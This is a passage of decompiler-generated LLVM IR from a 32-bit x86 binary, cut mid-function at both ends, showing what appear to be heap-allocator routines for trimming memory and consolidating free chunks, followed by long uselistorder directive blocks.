  %v1_80504e7 = load i32, i32* @ebx, align 4
  %v2_80504e7 = add i32 %v0_804ffb5, 4
  %v3_80504e7 = add i32 %v2_80504e7, %v1_80504e7
  %v4_80504e7 = inttoptr i32 %v3_80504e7 to i32*
  %v5_80504e7 = load i32, i32* %v4_80504e7, align 4
  %v6_80504e7 = or i32 %v5_80504e7, 1
  store i32 %v6_80504e7, i32* %v4_80504e7, align 4
  br label %dec_label_pc_80504ec

dec_label_pc_80504ec:                             ; preds = %dec_label_pc_804ffc1, %dec_label_pc_80504e7
  %v0_80504ec = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80504ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504f0:                             ; preds = %dec_label_pc_8050293, %dec_label_pc_8050432, %dec_label_pc_80502d5, %dec_label_pc_80502ab
  %v0_80504f0 = load i32, i32* %stack_var_-92, align 4
  %v1_80504f0 = call i32 @function_804e694(i32 %v0_80504f0)
  store i32 %v1_80504f0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80504f7 = inttoptr i32 %v1_80504f0 to i32*
  store i32 12, i32* %v1_80504f7, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504fd:                             ; preds = %dec_label_pc_80504ec, %dec_label_pc_80504e2, %dec_label_pc_805048d, %dec_label_pc_8050123, %dec_label_pc_80500d5, %dec_label_pc_804fe54, %dec_label_pc_80504f0
  store i32 %v2_804fd8b, i32* @eax, align 4
  store i32 %v2_804fd8b, i32* %stack_var_-92, align 4
  %v2_8050506 = call i32 @function_80512e2(i32 %v2_804fd8b, i32 1)
  store i32 %v2_8050506, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805050e

dec_label_pc_805050e:                             ; preds = %dec_label_pc_804fda9, %dec_label_pc_80504fd
  %v0_8050511 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050511, i32* %eax.global-to-local, align 4
  %v2_8050513 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050513, i32* @ebx, align 4
  store i32 %v0_804fd78, i32* @esi, align 4
  store i32 %v0_804fd77, i32* @edi, align 4
  store i32 %v0_804fd76, i32* @ebp, align 4
  ret i32 %v0_8050511

; uselistorder directives
  uselistorder i32 %v0_80504d4, { 1, 0 }
  uselistorder i32 %v1_8050458, { 1, 0 }
  uselistorder i32 %v2_805044c, { 1, 0 }
  uselistorder i32 %v0_8050437, { 1, 0 }
  uselistorder i32 %v0_8050432, { 0, 2, 1 }
  uselistorder i32 %v1_80503c9, { 1, 0, 2 }
  uselistorder i32 %v0_80503c9, { 1, 0 }
  uselistorder i32 %v2_80503b7, { 1, 0 }
  uselistorder i32 %v1_805036e, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_805035c, { 1, 0, 2 }
  uselistorder i32 %v2_805034c, { 1, 2, 0 }
  uselistorder i32 %v2_8050347, { 1, 0, 2 }
  uselistorder i32 %v1_8050337, { 2, 1, 0 }
  uselistorder i8 %v0_8050305, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80502e8, { 1, 0, 2 }
  uselistorder i32 %v0_80503aa, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_805039c, { 2, 0, 1 }
  uselistorder i32 %v8_80502b8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_805029e, { 1, 0, 2 }
  uselistorder i32 %v3_805029e, { 1, 0 }
  uselistorder i32 %v1_805026c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050260, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805025c, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805024a, { 1, 0 }
  uselistorder i1 %v2_805023a, { 2, 1, 0 }
  uselistorder i32 %v1_805023a, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_805022a, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8050213, { 1, 0 }
  uselistorder i32 %v2_8050207, { 1, 0 }
  uselistorder i32 %v2_80501f7, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80501db, { 1, 2, 0 }
  uselistorder i32 %v1_80501db, { 1, 0, 2 }
  uselistorder i32 %v1_80501da, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_80501d4, { 1, 0 }
  uselistorder i32 %v2_80501b2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80501a6, { 2, 1, 0 }
  uselistorder i32 %v8_8050191, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8050178, { 1, 0, 2 }
  uselistorder i32 %v0_805011b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80500ea, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80500dd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80500c3, { 1, 0, 2 }
  uselistorder i32 %v1_805005d, { 1, 0 }
  uselistorder i32 %v3_8050052, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805004c, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80500497, { 1, 0 }
  uselistorder i32 %v2_805003e, { 1, 0 }
  uselistorder i32 %v1_8050022, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805001e, { 2, 1, 0 }
  uselistorder i32 %v1_805001a, { 1, 0 }
  uselistorder i32 %v1_8050015, { 2, 1, 0 }
  uselistorder i32 %v2_8050004, { 1, 0 }
  uselistorder i32 %v1_8050001, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804ff9f, { 0, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 %v0_804ffea, { 1, 0 }
  uselistorder i32 %v0_804ffb5, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ff8b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ff58, { 0, 2, 1 }
  uselistorder i32 %v2_804ff3c, { 1, 0 }
  uselistorder i32 %v1_804ff32, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804ff2d.lcssa, { 1, 0 }
  uselistorder i32 %v3_804ff1d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804ff14, { 1, 0, 2 }
  uselistorder i32 %v3_804fef7, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804fef0, { 1, 0, 2 }
  uselistorder i32 %v2_804fed8, { 2, 1, 0 }
  uselistorder i32 %v0_804fec4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804fe8a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80504af, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804ff589, { 1, 0, 2 }
  uselistorder i32 %v3_804fe37, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804fe29, { 2, 1, 0 }
  uselistorder i32 %v2_804fe04, { 2, 1, 0 }
  uselistorder i8 %v0_804fdd2, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_8050172, { 13, 32, 12, 5, 30, 11, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804fdbb, { 0, 2, 1 }
  uselistorder i32 %v0_804fda4, { 1, 0 }
  uselistorder i32 %v2_804fd8b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45 }
  uselistorder i32* %ecx.global-to-local, { 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %ebx.global-to-local, { 22, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 0, 11, 12, 14, 15, 16, 17, 21, 23, 24, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 58, 59, 60 }
  uselistorder i32 (i32)* @function_805074d, { 1, 3, 2, 0 }
  uselistorder i8 -2, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_805bd80.72, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051618, { 1, 0 }
  uselistorder i32 (i32)* @function_804fd76, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 134593108, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_805ba60.60, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804fd50, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805050e, { 1, 0 }
  uselistorder label %dec_label_pc_80504fd, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80504f0, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80504ec, { 1, 0 }
  uselistorder label %dec_label_pc_80504e2, { 1, 0 }
  uselistorder label %dec_label_pc_805048d, { 1, 0 }
  uselistorder label %dec_label_pc_8050432, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80503c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80503bf, { 1, 0 }
  uselistorder label %dec_label_pc_80503a3, { 1, 0 }
  uselistorder label %dec_label_pc_805034c, { 1, 0 }
  uselistorder label %dec_label_pc_8050335, { 1, 0 }
  uselistorder label %dec_label_pc_805031e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80502d5, { 1, 0 }
  uselistorder label %dec_label_pc_8050293, { 1, 0 }
  uselistorder label %dec_label_pc_805022a, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80501c9, { 1, 0 }
  uselistorder label %dec_label_pc_80500dd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80500d5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050049, { 1, 0 }
  uselistorder label %dec_label_pc_805004e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050022, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ffa9, { 1, 0 }
  uselistorder label %dec_label_pc_804ff58, { 1, 0 }
  uselistorder label %dec_label_pc_804ff30, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ff19, { 1, 0 }
  uselistorder label %dec_label_pc_804fe87, { 1, 0 }
  uselistorder label %dec_label_pc_804ff58.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fe54, { 1, 0 }
  uselistorder label %dec_label_pc_804fdd2, { 1, 0 }
}

define i32 @function_8050518() local_unnamed_addr {
dec_label_pc_8050518:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8050519 = load i32, i32* @edx, align 4
  store i32 %v0_8050519, i32* %ebp.global-to-local, align 4
  %v0_805051c = load i32, i32* @esi, align 4
  %v1_8050521 = add i32 %v0_8050519, 860
  %v2_8050521 = inttoptr i32 %v1_8050521 to i32*
  %v3_8050521 = load i32, i32* %v2_8050521, align 4
  %v1_8050527 = add i32 %v0_8050519, 44
  %v2_8050527 = inttoptr i32 %v1_8050527 to i32*
  %v3_8050527 = load i32, i32* %v2_8050527, align 4
  %v1_805052a = add i32 %v3_8050527, 4
  %v2_805052a = inttoptr i32 %v1_805052a to i32*
  %v3_805052a = load i32, i32* %v2_805052a, align 4
  %v1_805052d = and i32 %v3_805052a, -4
  store i32 %v1_805052d, i32* @esi, align 4
  %v1_8050532 = load i32, i32* @eax, align 4
  %v2_8050532 = add i32 %v3_8050521, -17
  %v2_8050534 = add i32 %v2_8050532, %v1_805052d
  %v3_8050534 = sub i32 %v2_8050534, %v1_8050532
  %div = udiv i32 %v3_8050534, %v3_8050521
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_805053c = add i32 %div, -1
  %v4_805053f = mul i32 %v1_805053c, %v3_8050521
  store i32 %v4_805053f, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805053f, 1
  br i1 %tmp11, label %dec_label_pc_805059b, label %dec_label_pc_8050546

dec_label_pc_8050546:                             ; preds = %dec_label_pc_8050518
  %v1_805054b = call i32 @function_805182c(i32 0)
  store i32 %v1_805054b, i32* %edi.global-to-local, align 4
  %v0_8050555 = load i32, i32* @esi, align 4
  store i32 %v0_8050555, i32* %eax.global-to-local, align 4
  %v1_8050557 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050557 = add i32 %v1_8050557, 44
  %v3_8050557 = inttoptr i32 %v2_8050557 to i32*
  %v4_8050557 = load i32, i32* %v3_8050557, align 4
  %v5_8050557 = add i32 %v4_8050557, %v0_8050555
  store i32 %v5_8050557, i32* %eax.global-to-local, align 4
  %v12_805055a = icmp eq i32 %v1_805054b, %v5_8050557
  %v1_805055c = icmp eq i1 %v12_805055a, false
  br i1 %v1_805055c, label %dec_label_pc_805059b, label %dec_label_pc_805055e

dec_label_pc_805055e:                             ; preds = %dec_label_pc_8050546
  %v1_8050561 = sub i32 0, %v4_805053f
  store i32 %v1_8050561, i32* @ebx, align 4
  %v1_8050564 = call i32 @function_805182c(i32 %v1_8050561)
  store i32 %v1_8050564, i32* %eax.global-to-local, align 4
  %v1_8050570 = call i32 @function_805182c(i32 0)
  store i32 %v1_8050570, i32* %eax.global-to-local, align 4
  %v10_8050578 = icmp eq i32 %v1_8050570, -1
  br i1 %v10_8050578, label %dec_label_pc_805059b, label %dec_label_pc_805057d

dec_label_pc_805057d:                             ; preds = %dec_label_pc_805055e
  %v0_805057d = load i32, i32* %edi.global-to-local, align 4
  %v2_805057f = sub i32 %v0_805057d, %v1_8050570
  %v12_805057f = icmp eq i32 %v2_805057f, 0
  br i1 %v12_805057f, label %dec_label_pc_805059b, label %dec_label_pc_8050583

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805057d
  %v0_8050583 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050583 = add i32 %v0_8050583, 44
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  store i32 %v3_8050583, i32* %eax.global-to-local, align 4
  %v0_8050586 = load i32, i32* @esi, align 4
  %v2_8050586 = sub i32 %v0_8050586, %v2_805057f
  store i32 %v2_8050586, i32* %esi.global-to-local, align 4
  %v1_8050588 = add i32 %v0_8050583, 872
  %v2_8050588 = inttoptr i32 %v1_8050588 to i32*
  %v3_8050588 = load i32, i32* %v2_8050588, align 4
  %v5_8050588 = sub i32 %v3_8050588, %v2_805057f
  store i32 %v5_8050588, i32* %v2_8050588, align 4
  %v0_805058e = load i32, i32* %esi.global-to-local, align 4
  %v1_805058e = or i32 %v0_805058e, 1
  store i32 %v1_805058e, i32* %esi.global-to-local, align 4
  %v1_8050591 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050591 = add i32 %v1_8050591, 4
  %v3_8050591 = inttoptr i32 %v2_8050591 to i32*
  store i32 %v1_805058e, i32* %v3_8050591, align 4
  br label %dec_label_pc_805059d

dec_label_pc_805059b:                             ; preds = %dec_label_pc_805057d, %dec_label_pc_805055e, %dec_label_pc_8050546, %dec_label_pc_8050518
  br label %dec_label_pc_805059d

dec_label_pc_805059d:                             ; preds = %dec_label_pc_8050583, %dec_label_pc_805059b
  %storemerge = phi i32 [ 1, %dec_label_pc_8050583 ], [ 0, %dec_label_pc_805059b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805051c, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050570, { 1, 0, 2 }
  uselistorder i32 %v4_805053f, { 1, 2, 0 }
  uselistorder i32 %v3_8050521, { 0, 2, 1 }
  uselistorder i32 %v0_8050519, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_805182c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805059d, { 1, 0 }
}

define i32 @function_80505a5(i32* %arg1) local_unnamed_addr {
dec_label_pc_80505a5:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80505a6 = load i32, i32* @edi, align 4
  %v0_80505a7 = load i32, i32* @esi, align 4
  %v0_80505a8 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80505b0 = load i32, i32* %arg1, align 4
  store i32 %v2_80505b0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80505b7 = icmp eq i32 %v2_80505b0, 0
  br i1 %v1_80505b7, label %dec_label_pc_80506d1.lr.ph, label %dec_label_pc_80505bf

dec_label_pc_80506d1.lr.ph:                       ; preds = %dec_label_pc_80505a5
  %v3_80506d5 = add i32 %tmp20, 44
  br label %dec_label_pc_80506d1

dec_label_pc_80505bf:                             ; preds = %dec_label_pc_80505a5
  %v1_80505c3 = and i32 %v2_80505b0, -3
  store i32 %v1_80505c3, i32* %arg1, align 4
  %v1_80505c8 = add i32 %tmp20, 52
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80505e4 = udiv i32 %v1_80505c3, 8
  %v2_80505e7 = mul nuw i32 %v2_80505e4, 4
  %v3_80505e7 = add i32 %tmp20, -4
  %v4_80505e7 = add i32 %v3_80505e7, %v2_80505e7
  store i32 %v4_80505e7, i32* %eax.global-to-local, align 4
  %v2_80506ae = add i32 %tmp20, 44
  %v3_80506ae = inttoptr i32 %v2_80506ae to i32*
  %v1_8050681 = add i32 %tmp20, 60
  %v2_8050681 = inttoptr i32 %v1_8050681 to i32*
  br label %dec_label_pc_80505ef

dec_label_pc_80505ef:                             ; preds = %dec_label_pc_80506c7, %dec_label_pc_80505bf
  %v0_80505fd.in = phi i32 [ %tmp20, %dec_label_pc_80505bf ], [ %v0_80505fd, %dec_label_pc_80506c7 ]
  %v0_80505fd = add i32 %v0_80505fd.in, 4
  store i32 %v0_80505fd, i32* %eax.global-to-local, align 4
  %v1_80505f3 = inttoptr i32 %v0_80505fd to i32*
  %v2_80505f3 = load i32, i32* %v1_80505f3, align 4
  store i32 %v2_80505f3, i32* @ecx, align 4
  %v1_80505f5 = icmp eq i32 %v2_80505f3, 0
  br i1 %v1_80505f5, label %dec_label_pc_80506bd, label %dec_label_pc_80505fd

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_80505ef
  store i32 0, i32* %v1_80505f3, align 4
  %v0_8050603.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050603

dec_label_pc_8050603:                             ; preds = %dec_label_pc_80506b1, %dec_label_pc_80505fd
  %v0_8050620 = phi i32 [ %v3_8050603, %dec_label_pc_80506b1 ], [ %v0_8050603.pre, %dec_label_pc_80505fd ]
  %v1_8050603 = add i32 %v0_8050620, 8
  %v2_8050603 = inttoptr i32 %v1_8050603 to i32*
  %v3_8050603 = load i32, i32* %v2_8050603, align 4
  store i32 %v3_8050603, i32* %edx.global-to-local, align 4
  %v1_805060a = add i32 %v0_8050620, 4
  %v2_805060a = inttoptr i32 %v1_805060a to i32*
  %v3_805060a = load i32, i32* %v2_805060a, align 4
  store i32 %v3_805060a, i32* %eax.global-to-local, align 4
  %v1_805060f = and i32 %v3_805060a, -2
  store i32 %v1_805060f, i32* @edi, align 4
  %v2_8050612 = urem i32 %v3_805060a, 2
  %v3_8050612 = icmp eq i32 %v2_8050612, 0
  %v2_8050614 = add i32 %v1_805060f, %v0_8050620
  store i32 %v2_8050614, i32* @ebx, align 4
  %v1_8050617 = add i32 %v2_8050614, 4
  %v2_8050617 = inttoptr i32 %v1_8050617 to i32*
  %v3_8050617 = load i32, i32* %v2_8050617, align 4
  store i32 %v3_8050617, i32* %edx.global-to-local, align 4
  %v1_805061e = icmp eq i1 %v3_8050612, false
  br i1 %v1_805061e, label %dec_label_pc_8050640, label %dec_label_pc_8050620

dec_label_pc_8050620:                             ; preds = %dec_label_pc_8050603
  %v1_8050620 = inttoptr i32 %v0_8050620 to i32*
  %v2_8050620 = load i32, i32* %v1_8050620, align 4
  store i32 %v2_8050620, i32* %ebp.global-to-local, align 4
  %v2_8050624 = sub i32 %v0_8050620, %v2_8050620
  store i32 %v2_8050624, i32* %eax.global-to-local, align 4
  %v1_8050626 = add i32 %v2_8050624, 8
  %v2_8050626 = inttoptr i32 %v1_8050626 to i32*
  %v3_8050626 = load i32, i32* %v2_8050626, align 4
  store i32 %v3_8050626, i32* @esi, align 4
  %v1_8050629 = add i32 %v2_8050624, 12
  %v2_8050629 = inttoptr i32 %v1_8050629 to i32*
  %v3_8050629 = load i32, i32* %v2_8050629, align 4
  store i32 %v3_8050629, i32* %edx.global-to-local, align 4
  %v1_805062c = add i32 %v3_8050626, 12
  %v2_805062c = inttoptr i32 %v1_805062c to i32*
  %v3_805062c = load i32, i32* %v2_805062c, align 4
  store i32 %v3_805062c, i32* @ecx, align 4
  %v12_805062f = icmp eq i32 %v3_805062c, %v2_8050624
  %v1_8050631 = icmp eq i1 %v12_805062f, false
  br i1 %v1_8050631, label %dec_label_pc_8050670, label %dec_label_pc_8050633

dec_label_pc_8050633:                             ; preds = %dec_label_pc_8050620
  %v1_8050633 = add i32 %v3_8050629, 8
  %v2_8050633 = inttoptr i32 %v1_8050633 to i32*
  %v3_8050633 = load i32, i32* %v2_8050633, align 4
  %v15_8050633 = icmp eq i32 %v3_8050633, %v3_805062c
  %v1_8050636 = icmp eq i1 %v15_8050633, false
  br i1 %v1_8050636, label %dec_label_pc_8050670, label %dec_label_pc_8050638

dec_label_pc_8050638:                             ; preds = %dec_label_pc_8050633
  %v2_8050638 = add i32 %v2_8050620, %v1_805060f
  store i32 %v2_8050638, i32* @edi, align 4
  store i32 %v3_8050629, i32* %v2_805062c, align 4
  %v0_805063d = load i32, i32* @esi, align 4
  %v1_805063d = load i32, i32* %edx.global-to-local, align 4
  %v2_805063d = add i32 %v1_805063d, 8
  %v3_805063d = inttoptr i32 %v2_805063d to i32*
  store i32 %v0_805063d, i32* %v3_805063d, align 4
  %v0_805064b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050640

dec_label_pc_8050640:                             ; preds = %dec_label_pc_8050603, %dec_label_pc_8050638
  %v1_8050654 = phi i32 [ %v2_8050614, %dec_label_pc_8050603 ], [ %v0_805064b.pre, %dec_label_pc_8050638 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8050648 = and i32 %v3_8050617, -4
  store i32 %v1_8050648, i32* %ebp.global-to-local, align 4
  %v4_805064b = load i32, i32* %v3_80506ae, align 4
  %v15_805064b = icmp eq i32 %v1_8050654, %v4_805064b
  br i1 %v15_805064b, label %dec_label_pc_80506a1, label %dec_label_pc_8050650

dec_label_pc_8050650:                             ; preds = %dec_label_pc_8050640
  %v2_8050650 = add i32 %v1_8050654, 4
  %v3_8050650 = add i32 %v2_8050650, %v1_8050648
  %v4_8050650 = inttoptr i32 %v3_8050650 to i32*
  %v5_8050650 = load i32, i32* %v4_8050650, align 4
  store i32 %v5_8050650, i32* %eax.global-to-local, align 4
  %v3_8050654 = inttoptr i32 %v2_8050650 to i32*
  store i32 %v1_8050648, i32* %v3_8050654, align 4
  %v0_8050657 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050657 = urem i32 %v0_8050657, 2
  %v2_8050657 = icmp eq i32 %v1_8050657, 0
  store i32 %v1_8050657, i32* %eax.global-to-local, align 4
  %v1_805065c = icmp eq i1 %v2_8050657, false
  br i1 %v1_805065c, label %dec_label_pc_805067d, label %dec_label_pc_805065e

dec_label_pc_805065e:                             ; preds = %dec_label_pc_8050650
  %v0_805065e = load i32, i32* @ebx, align 4
  %v1_805065e = add i32 %v0_805065e, 8
  %v2_805065e = inttoptr i32 %v1_805065e to i32*
  %v3_805065e = load i32, i32* %v2_805065e, align 4
  store i32 %v3_805065e, i32* @edx, align 4
  %v1_8050661 = add i32 %v0_805065e, 12
  %v2_8050661 = inttoptr i32 %v1_8050661 to i32*
  %v3_8050661 = load i32, i32* %v2_8050661, align 4
  store i32 %v3_8050661, i32* %eax.global-to-local, align 4
  %v1_8050664 = add i32 %v3_805065e, 12
  %v2_8050664 = inttoptr i32 %v1_8050664 to i32*
  %v3_8050664 = load i32, i32* %v2_8050664, align 4
  store i32 %v3_8050664, i32* @esi, align 4
  %v12_8050667 = icmp eq i32 %v3_8050664, %v0_805065e
  %v1_8050669 = icmp eq i1 %v12_8050667, false
  br i1 %v1_8050669, label %dec_label_pc_8050670, label %dec_label_pc_805066b

dec_label_pc_805066b:                             ; preds = %dec_label_pc_805065e
  %v1_805066b = add i32 %v3_8050661, 8
  %v2_805066b = inttoptr i32 %v1_805066b to i32*
  %v3_805066b = load i32, i32* %v2_805066b, align 4
  %v15_805066b = icmp eq i32 %v3_805066b, %v3_8050664
  br i1 %v15_805066b, label %dec_label_pc_8050675, label %dec_label_pc_8050670

dec_label_pc_8050670:                             ; preds = %dec_label_pc_805066b, %dec_label_pc_805065e, %dec_label_pc_8050633, %dec_label_pc_8050620
  %v0_8050670 = call i32 @function_805090c()
  store i32 %v0_8050670, i32* %eax.global-to-local, align 4
  %v1_8050677.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050675

dec_label_pc_8050675:                             ; preds = %dec_label_pc_805066b, %dec_label_pc_8050670
  %v1_8050677 = phi i32 [ %v3_805065e, %dec_label_pc_805066b ], [ %v1_8050677.pre, %dec_label_pc_8050670 ]
  %v0_8050677 = phi i32 [ %v3_8050661, %dec_label_pc_805066b ], [ %v0_8050670, %dec_label_pc_8050670 ]
  %v0_8050675 = load i32, i32* @edi, align 4
  %v1_8050675 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050675 = add i32 %v1_8050675, %v0_8050675
  store i32 %v2_8050675, i32* @edi, align 4
  %v2_8050677 = add i32 %v1_8050677, 12
  %v3_8050677 = inttoptr i32 %v2_8050677 to i32*
  store i32 %v0_8050677, i32* %v3_8050677, align 4
  %v0_805067a = load i32, i32* @edx, align 4
  %v1_805067a = load i32, i32* %eax.global-to-local, align 4
  %v2_805067a = add i32 %v1_805067a, 8
  %v3_805067a = inttoptr i32 %v2_805067a to i32*
  store i32 %v0_805067a, i32* %v3_805067a, align 4
  br label %dec_label_pc_805067d

dec_label_pc_805067d:                             ; preds = %dec_label_pc_8050650, %dec_label_pc_8050675
  store i32 %v1_80505c8, i32* %eax.global-to-local, align 4
  %v3_8050681 = load i32, i32* %v2_8050681, align 4
  store i32 %v3_8050681, i32* %edx.global-to-local, align 4
  %v0_8050684 = load i32, i32* @ecx, align 4
  store i32 %v0_8050684, i32* %v2_8050681, align 4
  %v0_8050687 = load i32, i32* @edi, align 4
  %v1_8050689 = or i32 %v0_8050687, 1
  %v1_805068c = load i32, i32* @ecx, align 4
  %v2_805068c = add i32 %v1_805068c, 4
  %v3_805068c = inttoptr i32 %v2_805068c to i32*
  store i32 %v1_8050689, i32* %v3_805068c, align 4
  %v0_805068f = load i32, i32* @ecx, align 4
  %v1_805068f = load i32, i32* %edx.global-to-local, align 4
  %v2_805068f = add i32 %v1_805068f, 12
  %v3_805068f = inttoptr i32 %v2_805068f to i32*
  store i32 %v0_805068f, i32* %v3_805068f, align 4
  store i32 %v1_80505c8, i32* %eax.global-to-local, align 4
  %v0_8050696 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050696 = load i32, i32* @ecx, align 4
  %v2_8050696 = add i32 %v1_8050696, 8
  %v3_8050696 = inttoptr i32 %v2_8050696 to i32*
  store i32 %v0_8050696, i32* %v3_8050696, align 4
  %v0_8050699 = load i32, i32* @edi, align 4
  %v1_8050699 = load i32, i32* @ecx, align 4
  %v3_8050699 = add i32 %v1_8050699, %v0_8050699
  %v4_8050699 = inttoptr i32 %v3_8050699 to i32*
  store i32 %v0_8050699, i32* %v4_8050699, align 4
  %v0_805069c = load i32, i32* %eax.global-to-local, align 4
  %v1_805069c = load i32, i32* @ecx, align 4
  %v2_805069c = add i32 %v1_805069c, 12
  %v3_805069c = inttoptr i32 %v2_805069c to i32*
  store i32 %v0_805069c, i32* %v3_805069c, align 4
  br label %dec_label_pc_80506b1

dec_label_pc_80506a1:                             ; preds = %dec_label_pc_8050640
  %v0_80506a1 = load i32, i32* @edi, align 4
